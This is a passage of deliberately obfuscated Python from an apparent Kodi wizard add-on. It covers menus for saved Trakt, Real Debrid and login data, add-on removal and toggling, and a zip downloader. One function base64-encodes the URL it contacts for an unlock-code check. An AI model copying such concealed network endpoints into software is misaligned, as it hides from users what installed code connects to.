		OO000000OOO0OO000 =createMenu ('save','Trakt',O0O000O000OOO0OO0 )#line:3765
		OOO0OOO0O0OOO0O0O .append ((THEME2 %'%s Settings'%O0O000000O00O0O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0O000O000OOO0OO0 )))#line:3766
		addFile ('[+]-> %s'%O0O000000O00O0O00 ,'',icon =OOOO0O0O0O0OOO00O ,fanart =OO0O0O0OO000O0O0O ,themeit =THEME3 )#line:3768
		if not os .path .exists (OOO000000O000OOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO0O0O0O0OOO00O ,fanart =OO0O0O0OO000O0O0O ,menu =OOO0OOO0O0OOO0O0O )#line:3769
		elif not OO00O0OO0OO00O0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0O000O000OOO0OO0 ,icon =OOOO0O0O0O0OOO00O ,fanart =OO0O0O0OO000O0O0O ,menu =OOO0OOO0O0OOO0O0O )#line:3770
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00O0OO0OO00O0OO ,'authtrakt',O0O000O000OOO0OO0 ,icon =OOOO0O0O0O0OOO00O ,fanart =OO0O0O0OO000O0O0O ,menu =OOO0OOO0O0OOO0O0O )#line:3771
		if O0O0O0OOO0OO0O000 =="":#line:3772
			if os .path .exists (O00OOO0OO00O00OOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0O000O000OOO0OO0 ,icon =OOOO0O0O0O0OOO00O ,fanart =OO0O0O0OO000O0O0O ,menu =OO000000OOO0OO000 )#line:3773
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0O000O000OOO0OO0 ,icon =OOOO0O0O0O0OOO00O ,fanart =OO0O0O0OO000O0O0O ,menu =OO000000OOO0OO000 )#line:3774
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O0OOO0OO0O000 ,'',icon =OOOO0O0O0O0OOO00O ,fanart =OO0O0O0OO000O0O0O ,menu =OO000000OOO0OO000 )#line:3775
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3777
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3778
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3779
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3780
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3781
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3782
	setView ('files','viewType')#line:3783
def realMenu ():#line:3785
	O0O0O00O0O0000OO0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3786
	O000O0O0000O00OOO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3787
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3788
	addFile ('Save Real Debrid Data: %s'%O0O0O00O0O0000OO0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3789
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O000O0O0000O00OOO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3790
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3791
	for OOO000OOOOO0O00O0 in debridit .ORDER :#line:3793
		O0O00O00OOOOO0O00 =DEBRIDID [OOO000OOOOO0O00O0 ]['name']#line:3794
		O000OOO0OOOOOO00O =DEBRIDID [OOO000OOOOO0O00O0 ]['path']#line:3795
		O0O00O0O0O00O0O0O =DEBRIDID [OOO000OOOOO0O00O0 ]['saved']#line:3796
		OO0O00OO000O00O00 =DEBRIDID [OOO000OOOOO0O00O0 ]['file']#line:3797
		O0O00OO0O000000OO =wiz .getS (O0O00O0O0O00O0O0O )#line:3798
		O000O0OOO00O00000 =debridit .debridUser (OOO000OOOOO0O00O0 )#line:3799
		O0OO000OO0OOO000O =DEBRIDID [OOO000OOOOO0O00O0 ]['icon']if os .path .exists (O000OOO0OOOOOO00O )else ICONREAL #line:3800
		O00OO0OOO0O00OOOO =DEBRIDID [OOO000OOOOO0O00O0 ]['fanart']if os .path .exists (O000OOO0OOOOOO00O )else FANART #line:3801
		OO000O00O0OOO0O0O =createMenu ('saveaddon','Debrid',OOO000OOOOO0O00O0 )#line:3802
		O0OOO0O0OO0O000O0 =createMenu ('save','Debrid',OOO000OOOOO0O00O0 )#line:3803
		OO000O00O0OOO0O0O .append ((THEME2 %'%s Settings'%O0O00O00OOOOO0O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO000OOOOO0O00O0 )))#line:3804
		addFile ('[+]-> %s'%O0O00O00OOOOO0O00 ,'',icon =O0OO000OO0OOO000O ,fanart =O00OO0OOO0O00OOOO ,themeit =THEME3 )#line:3806
		if not os .path .exists (O000OOO0OOOOOO00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OO000OO0OOO000O ,fanart =O00OO0OOO0O00OOOO ,menu =OO000O00O0OOO0O0O )#line:3807
		elif not O000O0OOO00O00000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO000OOOOO0O00O0 ,icon =O0OO000OO0OOO000O ,fanart =O00OO0OOO0O00OOOO ,menu =OO000O00O0OOO0O0O )#line:3808
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000O0OOO00O00000 ,'authdebrid',OOO000OOOOO0O00O0 ,icon =O0OO000OO0OOO000O ,fanart =O00OO0OOO0O00OOOO ,menu =OO000O00O0OOO0O0O )#line:3809
		if O0O00OO0O000000OO =="":#line:3810
			if os .path .exists (OO0O00OO000O00O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO000OOOOO0O00O0 ,icon =O0OO000OO0OOO000O ,fanart =O00OO0OOO0O00OOOO ,menu =O0OOO0O0OO0O000O0 )#line:3811
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO000OOOOO0O00O0 ,icon =O0OO000OO0OOO000O ,fanart =O00OO0OOO0O00OOOO ,menu =O0OOO0O0OO0O000O0 )#line:3812
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OO0O000000OO ,'',icon =O0OO000OO0OOO000O ,fanart =O00OO0OOO0O00OOOO ,menu =O0OOO0O0OO0O000O0 )#line:3813
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3815
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3816
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3817
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3818
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3819
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3820
	setView ('files','viewType')#line:3821
def loginMenu ():#line:3823
	OOOOOOO0O0O0OO0O0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3824
	OOO0O0OO0O0OOOO00 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3825
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3826
	addFile ('Save Login Data: %s'%OOOOOOO0O0O0OO0O0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3827
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOO0O0OO0O0OOOO00 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3828
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3829
	for OOOOOOO0O0O0OO0O0 in loginit .ORDER :#line:3831
		OO00OOO00000OO0O0 =LOGINID [OOOOOOO0O0O0OO0O0 ]['name']#line:3832
		O0O000O00O0OO0000 =LOGINID [OOOOOOO0O0O0OO0O0 ]['path']#line:3833
		OOO000OO0000OO000 =LOGINID [OOOOOOO0O0O0OO0O0 ]['saved']#line:3834
		OOO0O0OO00000O000 =LOGINID [OOOOOOO0O0O0OO0O0 ]['file']#line:3835
		OOO0OOO0O0O0OO00O =wiz .getS (OOO000OO0000OO000 )#line:3836
		O0O00O00O00O00OOO =loginit .loginUser (OOOOOOO0O0O0OO0O0 )#line:3837
		O0O0OO0O0OOO0O000 =LOGINID [OOOOOOO0O0O0OO0O0 ]['icon']if os .path .exists (O0O000O00O0OO0000 )else ICONLOGIN #line:3838
		O0OOOO0OO0OOOO00O =LOGINID [OOOOOOO0O0O0OO0O0 ]['fanart']if os .path .exists (O0O000O00O0OO0000 )else FANART #line:3839
		O0OOOO0OO000O0OO0 =createMenu ('saveaddon','Login',OOOOOOO0O0O0OO0O0 )#line:3840
		OOO0O00OOOO0000O0 =createMenu ('save','Login',OOOOOOO0O0O0OO0O0 )#line:3841
		O0OOOO0OO000O0OO0 .append ((THEME2 %'%s Settings'%OO00OOO00000OO0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOOOOOO0O0O0OO0O0 )))#line:3842
		addFile ('[+]-> %s'%OO00OOO00000OO0O0 ,'',icon =O0O0OO0O0OOO0O000 ,fanart =O0OOOO0OO0OOOO00O ,themeit =THEME3 )#line:3844
		if not os .path .exists (O0O000O00O0OO0000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O0OO0O0OOO0O000 ,fanart =O0OOOO0OO0OOOO00O ,menu =O0OOOO0OO000O0OO0 )#line:3845
		elif not O0O00O00O00O00OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOOOOOO0O0O0OO0O0 ,icon =O0O0OO0O0OOO0O000 ,fanart =O0OOOO0OO0OOOO00O ,menu =O0OOOO0OO000O0OO0 )#line:3846
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00O00O00O00OOO ,'authlogin',OOOOOOO0O0O0OO0O0 ,icon =O0O0OO0O0OOO0O000 ,fanart =O0OOOO0OO0OOOO00O ,menu =O0OOOO0OO000O0OO0 )#line:3847
		if OOO0OOO0O0O0OO00O =="":#line:3848
			if os .path .exists (OOO0O0OO00000O000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOOOOOO0O0O0OO0O0 ,icon =O0O0OO0O0OOO0O000 ,fanart =O0OOOO0OO0OOOO00O ,menu =OOO0O00OOOO0000O0 )#line:3849
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOOOOOO0O0O0OO0O0 ,icon =O0O0OO0O0OOO0O000 ,fanart =O0OOOO0OO0OOOO00O ,menu =OOO0O00OOOO0000O0 )#line:3850
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0OOO0O0O0OO00O ,'',icon =O0O0OO0O0OOO0O000 ,fanart =O0OOOO0OO0OOOO00O ,menu =OOO0O00OOOO0000O0 )#line:3851
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3853
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3854
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3855
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3856
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3857
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3858
	setView ('files','viewType')#line:3859
def fixUpdate ():#line:3861
	if KODIV <17 :#line:3862
		O0O00O0000000000O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3863
		try :#line:3864
			os .remove (O0O00O0000000000O )#line:3865
		except Exception as O0O0OO0OOOO0O0OO0 :#line:3866
			wiz .log ("Unable to remove %s, Purging DB"%O0O00O0000000000O )#line:3867
			wiz .purgeDb (O0O00O0000000000O )#line:3868
	else :#line:3869
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3870
def removeAddonMenu ():#line:3872
	O000O00O0O0OO0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3873
	O000OO0O0OO000000 =[];O0O00O0O00O0OOOO0 =[]#line:3874
	for OO0O00OOO0000O000 in sorted (O000O00O0O0OO0OO0 ,key =lambda O0OOOOO00O000O0OO :O0OOOOO00O000O0OO ):#line:3875
		O0O00OOO0O0OO0OO0 =os .path .split (OO0O00OOO0000O000 [:-1 ])[1 ]#line:3876
		if O0O00OOO0O0OO0OO0 in EXCLUDES :continue #line:3877
		elif O0O00OOO0O0OO0OO0 in DEFAULTPLUGINS :continue #line:3878
		elif O0O00OOO0O0OO0OO0 =='packages':continue #line:3879
		O0O0O0O0OO000OO0O =os .path .join (OO0O00OOO0000O000 ,'addon.xml')#line:3880
		if os .path .exists (O0O0O0O0OO000OO0O ):#line:3881
			OOOOOOOO000OO0O00 =open (O0O0O0O0OO000OO0O )#line:3882
			O0O0000000OOO0OO0 =OOOOOOOO000OO0O00 .read ()#line:3883
			OO0O0O0O0OO000O0O =wiz .parseDOM (O0O0000000OOO0OO0 ,'addon',ret ='id')#line:3884
			OO0OOOO000O000000 =O0O00OOO0O0OO0OO0 if len (OO0O0O0O0OO000O0O )==0 else OO0O0O0O0OO000O0O [0 ]#line:3886
			try :#line:3887
				O0OO0000OOOOOO00O =xbmcaddon .Addon (id =OO0OOOO000O000000 )#line:3888
				O000OO0O0OO000000 .append (O0OO0000OOOOOO00O .getAddonInfo ('name'))#line:3889
				O0O00O0O00O0OOOO0 .append (OO0OOOO000O000000 )#line:3890
			except :#line:3891
				pass #line:3892
	if len (O000OO0O0OO000000 )==0 :#line:3893
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3894
		return #line:3895
	if KODIV >16 :#line:3896
		OOOOO000O000OOO0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O000OO0O0OO000000 )#line:3897
	else :#line:3898
		OOOOO000O000OOO0O =[];O0000000OO00OO00O =0 #line:3899
		O0O0OOO00O0O00OOO =["-- Click here to Continue --"]+O000OO0O0OO000000 #line:3900
		while not O0000000OO00OO00O ==-1 :#line:3901
			O0000000OO00OO00O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0O0OOO00O0O00OOO )#line:3902
			if O0000000OO00OO00O ==-1 :break #line:3903
			elif O0000000OO00OO00O ==0 :break #line:3904
			else :#line:3905
				OO0O0OOOOO0OO0000 =(O0000000OO00OO00O -1 )#line:3906
				if OO0O0OOOOO0OO0000 in OOOOO000O000OOO0O :#line:3907
					OOOOO000O000OOO0O .remove (OO0O0OOOOO0OO0000 )#line:3908
					O0O0OOO00O0O00OOO [O0000000OO00OO00O ]=O000OO0O0OO000000 [OO0O0OOOOO0OO0000 ]#line:3909
				else :#line:3910
					OOOOO000O000OOO0O .append (OO0O0OOOOO0OO0000 )#line:3911
					O0O0OOO00O0O00OOO [O0000000OO00OO00O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O000OO0O0OO000000 [OO0O0OOOOO0OO0000 ])#line:3912
	if OOOOO000O000OOO0O ==None :return #line:3913
	if len (OOOOO000O000OOO0O )>0 :#line:3914
		wiz .addonUpdates ('set')#line:3915
		for O00OOOO0000OO0O0O in OOOOO000O000OOO0O :#line:3916
			removeAddon (O0O00O0O00O0OOOO0 [O00OOOO0000OO0O0O ],O000OO0O0OO000000 [O00OOOO0000OO0O0O ],True )#line:3917
		xbmc .sleep (1000 )#line:3919
		if INSTALLMETHOD ==1 :OOO00OO00OO0OO00O =1 #line:3921
		elif INSTALLMETHOD ==2 :OOO00OO00OO0OO00O =0 #line:3922
		else :OOO00OO00OO0OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3923
		if OOO00OO00OO0OO00O ==1 :wiz .reloadFix ('remove addon')#line:3924
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3925
def userkey ():#line:3926
    OO0O000O00OOOOOO0 =''#line:3927
    OOO0OOOO0O00OO000 =xbmc .Keyboard (OO0O000O00OOOOOO0 ,'הכנס קוד פתיחה')#line:3928
    OOO0OOOO0O00OO000 .doModal ()#line:3929
    if OOO0OOOO0O00OO000 .isConfirmed ():#line:3930
           OO0O000O00OOOOOO0 =OOO0OOOO0O00OO000 .getText ()#line:3931
    OOO0O0OOO00O00OO0 ="aHR0cDovL2tvZGkubGlmZS93aXphcmQ=".decode ('base64')+oo #line:3934
    O0OO0O0O0O0OOOO0O =urllib2 .urlopen (OOO0O0OOO00O00OO0 )#line:3935
    OO0O0O0OO00000000 =O0OO0O0O0O0OOOO0O .readlines ()#line:3936
    OOOOOOOO000OOO000 =0 #line:3937
    for O0O000OOO00O0O00O in OO0O0O0OO00000000 :#line:3938
        if O0O000OOO00O0O00O .split (' ==')[0 ]==OO0O000O00OOOOOO0 or O0O000OOO00O0O00O .split ()[0 ]==OO0O000O00OOOOOO0 :#line:3939
            OOOOOOOO000OOO000 =1 #line:3940
            break #line:3941
    if OOOOOOOO000OOO000 ==0 :#line:3942
       wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]קוד פתיחה שגוי[/COLOR]"%COLOR2 )#line:3943
       sys .exit ()#line:3944
    else :#line:3945
        xbmc .executebuiltin ("XBMC.Skin.ToggleSetting(aHR0cDovL)")#line:3946
        xbmc .executebuiltin ("ActivateWindow(home)")#line:3947
def removeAddonDataMenu ():#line:3948
	if os .path .exists (ADDOND ):#line:3949
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3950
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3951
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3952
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3953
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3954
		O0OO00O0O0OO00OOO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3955
		for O00OOOOOOO0OO0O00 in sorted (O0OO00O0O0OO00OOO ,key =lambda O0OO0000O0OO0OOO0 :O0OO0000O0OO0OOO0 ):#line:3956
			OO0O0O0O0OO0OO000 =O00OOOOOOO0OO0O00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3957
			OO00OOO000O000OOO =os .path .join (O00OOOOOOO0OO0O00 .replace (ADDOND ,ADDONS ),'icon.png')#line:3958
			O0000000OOOOO00O0 =os .path .join (O00OOOOOOO0OO0O00 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3959
			OOO0OO000O0O0OO00 =OO0O0O0O0OO0OO000 #line:3960
			OO0OO00OO0000O0O0 ={'audio.':'[COLOR silver][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR silver][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR silver][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR silver][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3961
			for O00O000000O00OOOO in OO0OO00OO0000O0O0 :#line:3962
				OOO0OO000O0O0OO00 =OOO0OO000O0O0OO00 .replace (O00O000000O00OOOO ,OO0OO00OO0000O0O0 [O00O000000O00OOOO ])#line:3963
			if OO0O0O0O0OO0OO000 in EXCLUDES :OOO0OO000O0O0OO00 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO0OO000O0O0OO00 #line:3964
			else :OOO0OO000O0O0OO00 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO0OO000O0O0OO00 #line:3965
			addFile (' %s'%OOO0OO000O0O0OO00 ,'removedata',OO0O0O0O0OO0OO000 ,icon =OO00OOO000O000OOO ,fanart =O0000000OOOOO00O0 ,themeit =THEME2 )#line:3966
	else :#line:3967
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3968
	setView ('files','viewType')#line:3969
def enableAddons ():#line:3971
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3972
	O0O00OO0000O0O0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3973
	O0O0OO0OOO0OO00O0 =0 #line:3974
	for OOO00OOOOO0000O00 in sorted (O0O00OO0000O0O0O0 ,key =lambda O0OOO000000OO00OO :O0OOO000000OO00OO ):#line:3975
		OOOOOO0OO00OO00O0 =os .path .split (OOO00OOOOO0000O00 [:-1 ])[1 ]#line:3976
		if OOOOOO0OO00OO00O0 in EXCLUDES :continue #line:3977
		if OOOOOO0OO00OO00O0 in DEFAULTPLUGINS :continue #line:3978
		O000OOO0000000O00 =os .path .join (OOO00OOOOO0000O00 ,'addon.xml')#line:3979
		if os .path .exists (O000OOO0000000O00 ):#line:3980
			O0O0OO0OOO0OO00O0 +=1 #line:3981
			O0O00OO0000O0O0O0 =OOO00OOOOO0000O00 .replace (ADDONS ,'')[1 :-1 ]#line:3982
			O0O00OOOO0O0O000O =open (O000OOO0000000O00 )#line:3983
			O0O000O00O00O0O00 =O0O00OOOO0O0O000O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3984
			O00000000O00OOOO0 =wiz .parseDOM (O0O000O00O00O0O00 ,'addon',ret ='id')#line:3985
			O0O00OOOO0O00OOOO =wiz .parseDOM (O0O000O00O00O0O00 ,'addon',ret ='name')#line:3986
			try :#line:3987
				O0O0O00OOO000OO00 =O00000000O00OOOO0 [0 ]#line:3988
				OOOOO0O000OOOO00O =O0O00OOOO0O00OOOO [0 ]#line:3989
			except :#line:3990
				continue #line:3991
			try :#line:3992
				O000OO0OOOO000O00 =xbmcaddon .Addon (id =O0O0O00OOO000OO00 )#line:3993
				OO0OO00OO00OOOOOO ="[COLOR green][Enabled][/COLOR]"#line:3994
				OOOO000O00O0O00OO ="false"#line:3995
			except :#line:3996
				OO0OO00OO00OOOOOO ="[COLOR red][Disabled][/COLOR]"#line:3997
				OOOO000O00O0O00OO ="true"#line:3998
				pass #line:3999
			OOO0OOO0O0O0O0OOO =os .path .join (OOO00OOOOO0000O00 ,'icon.png')if os .path .exists (os .path .join (OOO00OOOOO0000O00 ,'icon.png'))else ICON #line:4000
			O0OOOOO0O00OO00O0 =os .path .join (OOO00OOOOO0000O00 ,'fanart.jpg')if os .path .exists (os .path .join (OOO00OOOOO0000O00 ,'fanart.jpg'))else FANART #line:4001
			addFile ("%s %s"%(OO0OO00OO00OOOOOO ,OOOOO0O000OOOO00O ),'toggleaddon',O0O00OO0000O0O0O0 ,OOOO000O00O0O00OO ,icon =OOO0OOO0O0O0O0OOO ,fanart =O0OOOOO0O00OO00O0 )#line:4002
			O0O00OOOO0O0O000O .close ()#line:4003
	if O0O0OO0OOO0OO00O0 ==0 :#line:4004
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:4005
	setView ('files','viewType')#line:4006
def changeFeq ():#line:4008
	OOOO0O00OO0OOO0O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:4009
	OOOO000O00OOO00OO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOOO0O00OO0OOO0O0 )#line:4010
	if not OOOO000O00OOO00OO ==-1 :#line:4011
		wiz .setS ('autocleanfeq',str (OOOO000O00OOO00OO ))#line:4012
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOOO0O00OO0OOO0O0 [OOOO000O00OOO00OO ]))#line:4013
def developer ():#line:4015
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:4016
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:4017
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:4018
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:4019
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:4020
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:4021
	addFile ('Test APk','testapk',themeit =THEME1 )#line:4022
	setView ('files','viewType')#line:4024
def download (OO0OO0OOOOOO00O0O ,O00O000O0O0O0O000 ):#line:4029
  O0O0O0OO00OO0OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4030
  OOOOO00000OO0O0O0 =xbmcgui .DialogProgress ()#line:4031
  OOOOO00000OO0O0O0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:4032
  OOO00O00000O0O000 =os .path .join (O0O0O0OO00OO0OOO0 ,'isr.zip')#line:4033
  OOO0OO0O0O0OO00O0 =urllib2 .Request (OO0OO0OOOOOO00O0O )#line:4034
  OOOOO00OOO00O0000 =urllib2 .urlopen (OOO0OO0O0O0OO00O0 )#line:4035
  O00O0OO0OOOO00OO0 =xbmcgui .DialogProgress ()#line:4037
  O00O0OO0OOOO00OO0 .create ("Downloading","Downloading "+name )#line:4038
  O00O0OO0OOOO00OO0 .update (0 )#line:4039
  OO0O00O000OOO0OOO =O00O000O0O0O0O000 #line:4040
  OOO0O00OO00000OOO =open (OOO00O00000O0O000 ,'wb')#line:4041
  try :#line:4043
    OOO0O000000O0OOO0 =OOOOO00OOO00O0000 .info ().getheader ('Content-Length').strip ()#line:4044
    OOOOOOOOO0OOOO000 =True #line:4045
  except AttributeError :#line:4046
        OOOOOOOOO0OOOO000 =False #line:4047
  if OOOOOOOOO0OOOO000 :#line:4049
        OOO0O000000O0OOO0 =int (OOO0O000000O0OOO0 )#line:4050
  OOOO0000000000OO0 =0 #line:4052
  O0O0OO0OO00000OO0 =time .time ()#line:4053
  while True :#line:4054
        OOOO00OOOO00O00O0 =OOOOO00OOO00O0000 .read (8192 )#line:4055
        if not OOOO00OOOO00O00O0 :#line:4056
            sys .stdout .write ('\n')#line:4057
            break #line:4058
        OOOO0000000000OO0 +=len (OOOO00OOOO00O00O0 )#line:4060
        OOO0O00OO00000OOO .write (OOOO00OOOO00O00O0 )#line:4061
        if not OOOOOOOOO0OOOO000 :#line:4063
            OOO0O000000O0OOO0 =OOOO0000000000OO0 #line:4064
        if O00O0OO0OOOO00OO0 .iscanceled ():#line:4065
           O00O0OO0OOOO00OO0 .close ()#line:4066
           try :#line:4067
            os .remove (OOO00O00000O0O000 )#line:4068
           except :#line:4069
            pass #line:4070
           break #line:4071
        O0O00O00O0000O0O0 =float (OOOO0000000000OO0 )/OOO0O000000O0OOO0 #line:4072
        O0O00O00O0000O0O0 =round (O0O00O00O0000O0O0 *100 ,2 )#line:4073
        O0O0O000OO00000OO =OOOO0000000000OO0 /(1024 *1024 )#line:4074
        O0OOOO0O0O0OOO0O0 =OOO0O000000O0OOO0 /(1024 *1024 )#line:4075
        OO00O0O00OOO0O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0O000OO00000OO ,'teal',O0OOOO0O0O0OOO0O0 )#line:4076
        if (time .time ()-O0O0OO0OO00000OO0 )>0 :#line:4077
          O0000O0O000O00OO0 =OOOO0000000000OO0 /(time .time ()-O0O0OO0OO00000OO0 )#line:4078
          O0000O0O000O00OO0 =O0000O0O000O00OO0 /1024 #line:4079
        else :#line:4080
         O0000O0O000O00OO0 =0 #line:4081
        O0OO00O0OO00OO000 ='KB'#line:4082
        if O0000O0O000O00OO0 >=1024 :#line:4083
           O0000O0O000O00OO0 =O0000O0O000O00OO0 /1024 #line:4084
           O0OO00O0OO00OO000 ='MB'#line:4085
        if O0000O0O000O00OO0 >0 and not O0O00O00O0000O0O0 ==100 :#line:4086
            OO0O000O0O0OO00O0 =(OOO0O000000O0OOO0 -OOOO0000000000OO0 )/O0000O0O000O00OO0 #line:4087
        else :#line:4088
            OO0O000O0O0OO00O0 =0 #line:4089
        OO00OO0O0O00O000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0000O0O000O00OO0 ,O0OO00O0OO00OO000 )#line:4090
